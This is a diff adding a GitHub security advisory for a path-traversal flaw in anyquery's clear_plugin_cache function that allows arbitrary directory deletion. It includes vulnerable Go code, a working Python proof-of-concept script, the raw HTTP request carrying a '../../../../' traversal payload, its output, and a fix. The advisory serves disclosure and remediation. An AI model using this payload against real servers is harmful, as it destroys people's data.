@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-j9rx-rppg-6hh4",
+  "modified": "2026-06-10T17:15:06.886848611Z",
+  "published": "2026-06-10T17:11:53Z",
+  "aliases": [
+    "CVE-2026-47253"
+  ],
+  "summary": "Anyquery has Path Traversal through `clear_plugin_cache`, Allowing Arbitrary Directory Deletion",
+  "details": "# Path Traversal in `clear_plugin_cache` Allows Arbitrary Directory Deletion\n\n| Field            | Value |\n| ---------------- | ----- |\n| Repository       | julien040/anyquery |\n| Affected version | 0.4.4 |\n| Vulnerability    | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory |\n| Severity         | High |\n\n\n## Summary\n\nThe SQL scalar function `clear_plugin_cache(plugin)` in `namespace/other_functions.go` passes the caller-supplied `plugin` argument directly to `path.Join` and then to `os.RemoveAll`, with only an empty-string check as a guard. Because `path.Join` silently resolves `..` segments, a low-privileged bearer-token holder can submit `SELECT clear_plugin_cache('../../../../tmp/target')` to the `/v1/query` HTTP endpoint and delete any directory reachable by the server process. In the verified scenario, a directory outside `$XDG_CACHE_HOME/anyquery/plugins/` was successfully deleted, confirming full path-traversal exploitation.\n\n## Affected Code\n\n`namespace/other_functions.go:46` — `pathlib.Join` resolves `..` segments in attacker-controlled `plugin`, producing a path outside the cache root\n\n`namespace/other_functions.go:53` — `os.RemoveAll` unconditionally deletes the traversed path\n\n```go\nfunc clear_plugin_cache(plugin string) string {\n\tpathToRemove := pathlib.Join(xdg.CacheHome, \"anyquery\", \"plugins\", plugin)\n\n\tif plugin == \"\" {\n\t\treturn \"The plugin name is empty\"\n\t}\n\n\t// Remove the directory\n\terr := os.RemoveAll(pathToRemove)\n\tif err != nil {\n\t\treturn err.Error()\n\t}\n\n\treturn \"\"\n}\n```\n\nHTTP JSON `body.Query` → `executeQueryLLM` (`controller/llm.go:420-426`) → `shell.Run` → SQLite `clear_plugin_cache(plugin)` → `pathlib.Join(xdg.CacheHome, \"anyquery\", \"plugins\", plugin)` at `other_functions.go:46` → `os.RemoveAll` at `other_functions.go:53`\n\n## Proof of Concept\n\n**Prerequisites:**\n- Docker installed\n- Python 3 with `requests` package (`pip install requests`)\n\n**Step 1 — Build and start the vulnerable service:**\n\n```bash\ndocker build -f Dockerfile -t anyquery-vuln002 .\ndocker run --rm --name anyquery-vuln002 -p 127.0.0.1:8070:8070 anyquery-vuln002\n```\n\n**Step 2 — Run the PoC script (separate terminal):**\n\n```bash\npython3 poc.py\n```\n\n**poc.py:**\n\n```python\n#!/usr/bin/env python3\n\"\"\"PoC reproduction script — julien040/anyquery / VULN-002\n\nPrerequisites:\n    - Docker image built: docker build -f Dockerfile -t anyquery-vuln002 .\n    - Container running:  docker run --rm --name anyquery-vuln002 -p 127.0.0.1:8070:8070 anyquery-vuln002\n    - Python packages: requests (stdlib subprocess also used)\n\nHow to run (from this report directory, after Dockerfile service is up):\n    python3 poc.py\n\nExpected on success:\n    Final stdout line begins with `RESULT: PASS` confirming that the sentinel\n    directory outside the cache root was deleted via clear_plugin_cache path traversal.\n\"\"\"\n\nimport subprocess\nimport sys\nimport json\nimport requests\n\nBASE_URL = \"http://127.0.0.1:8070\"\nCONTAINER = \"anyquery-vuln002\"\n# Traversal payload: XDG_CACHE_HOME=/root/.cache, so\n# path.Join(\"/root/.cache\",\"anyquery\",\"plugins\",\"../../../../tmp/poc_sentinel\")\n# resolves to /tmp/poc_sentinel (4 levels up escapes the cache root).\nTRAVERSAL_PLUGIN = \"../../../../tmp/poc_sentinel\"\nSENTINEL_PATH = \"/tmp/poc_sentinel\"\nQUERY = f\"SELECT clear_plugin_cache('{TRAVERSAL_PLUGIN}')\"\n\n\ndef docker_exec(cmd):\n    result = subprocess.run(\n        [\"docker\", \"exec\", CONTAINER] + cmd,\n        capture_output=True, text=True\n    )\n    return result.returncode, result.stdout, result.stderr\n\n\ndef sentinel_exists():\n    rc, _, _ = docker_exec([\"test\", \"-d\", SENTINEL_PATH])\n    return rc == 0\n\n\n# Step 1: create sentinel inside container\nprint(f\"[1] Creating sentinel directory {SENTINEL_PATH} inside container...\")\nrc, out, err = docker_exec([\"mkdir\", \"-p\", SENTINEL_PATH])\nif rc != 0:\n    sys.exit(f\"RESULT: FAIL — could not create sentinel: {err}\")\nif not sentinel_exists():\n    sys.exit(\"RESULT: FAIL — sentinel not present after mkdir\")\nprint(f\"    Sentinel created: {SENTINEL_PATH}\")\n\n# Step 2: confirm server is reachable\nprint(\"[2] Confirming server is reachable...\")\ntry:\n    r = requests.get(f\"{BASE_URL}/list-tables\", timeout=5)\n    assert r.status_code == 200, f\"unexpected status {r.status_code}\"\n    print(f\"    GET /list-tables → HTTP {r.status_code} OK\")\nexcept Exception as e:\n    sys.exit(f\"RESULT: FAIL — server not reachable: {e}\")\n\n# Step 3: send traversal request\nprint(\"[3] Sending path-traversal payload via POST /execute-query...\")\npayload = {\"query\": QUERY}\nr = requests.post(\n    f\"{BASE_URL}/execute-query\",\n    headers={\"Content-Type\": \"application/json\"},\n    data=json.dumps(payload),\n    timeout=10,\n)\nprint(f\"    HTTP {r.status_code}\")\nprint(f\"    Body: {r.text.strip()}\")\n\nif r.status_code != 200:\n    sys.exit(f\"RESULT: FAIL — unexpected HTTP status {r.status_code}\")\n\n# Step 4: verify sentinel is gone\nprint(\"[4] Checking whether sentinel was deleted inside container...\")\nif sentinel_exists():\n    print(f\"    Sentinel still present — traversal did not delete it.\")\n    print(f\"RESULT: FAIL — {SENTINEL_PATH} still exists after traversal request\")\nelse:\n    print(f\"    Sentinel GONE — {SENTINEL_PATH} deleted outside cache root.\")\n    print(f\"RESULT: PASS — clear_plugin_cache('{TRAVERSAL_PLUGIN}') deleted {SENTINEL_PATH} (outside /root/.cache/anyquery/plugins/)\")\n```\n\n**HTTP request:**\n\n```http\nPOST /execute-query HTTP/1.1\nHost: 127.0.0.1:8070\nContent-Type: application/json\n\n{\"query\": \"SELECT clear_plugin_cache('../../../../tmp/poc_sentinel')\"}\n```\n\n**Output:**\n\n```text\n[1] Creating sentinel directory /tmp/poc_sentinel inside container...\n    Sentinel created: /tmp/poc_sentinel\n[2] Confirming server is reachable...\n    GET /list-tables → HTTP 200 OK\n[3] Sending path-traversal payload via POST /execute-query...\n    HTTP 200\n    Body: +----------------------------------------------------+\n| clear_plugin_cache('../../../../tmp/poc_sentinel') |\n+----------------------------------------------------+\n|                                                    |\n+----------------------------------------------------+\n1 results\n[4] Checking whether sentinel was deleted inside container...\n    Sentinel GONE — /tmp/poc_sentinel deleted outside cache root.\nRESULT: PASS — clear_plugin_cache('../../../../tmp/poc_sentinel') deleted /tmp/poc_sentinel (outside /root/.cache/anyquery/plugins/)\n```\n\n## Impact\n\nAn authenticated low-privileged API user can delete any directory accessible to the anyquery server process by supplying a `..`-traversing plugin name to `clear_plugin_cache`. Verified impact is permanent deletion of arbitrary directories outside the intended plugin cache boundary (`$XDG_CACHE_HOME/anyquery/plugins/`). In a realistic deployment, an attacker could target configuration directories, application data, or the user's home directory, causing irreversible data loss and denial of service. There is no confidentiality impact as the function only deletes and does not read data.\n\n## Remediation\n\nIn `namespace/other_functions.go`, resolve the full path and confirm it shares the expected cache-root prefix before calling `os.RemoveAll`:\n\n```go\nfunc clear_plugin_cache(plugin string) string {\n    if plugin == \"\" {\n        return \"The plugin name is empty\"\n    }\n    cacheRoot := pathlib.Join(xdg.CacheHome, \"anyquery\", \"plugins\")\n    pathToRemove := pathlib.Join(cacheRoot, plugin)\n    rel, err := filepath.Rel(cacheRoot, pathToRemove)\n    if err != nil || strings.HasPrefix(rel, \"..\") || rel == \"..\" {\n        return \"Invalid plugin name\"\n    }\n    if err := os.RemoveAll(pathToRemove); err != nil {\n        return err.Error()\n    }\n    return \"\"\n}\n```\n\nAs a defence-in-depth measure, also reject `plugin` values containing `/`, `\\`, or a leading `.` at the input level before the `path.Join` call, so traversal sequences are blocked at the earliest opportunity.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/julien040/anyquery",
+        "purl": "pkg:golang/github.com/julien040/anyquery"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.4.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.4.4",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-j9rx-rppg-6hh4/GHSA-j9rx-rppg-6hh4.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/julien040/anyquery/security/advisories/GHSA-j9rx-rppg-6hh4"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/julien040/anyquery"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/julien040/anyquery/releases/tag/0.4.5"
+    }
+  ]
+}
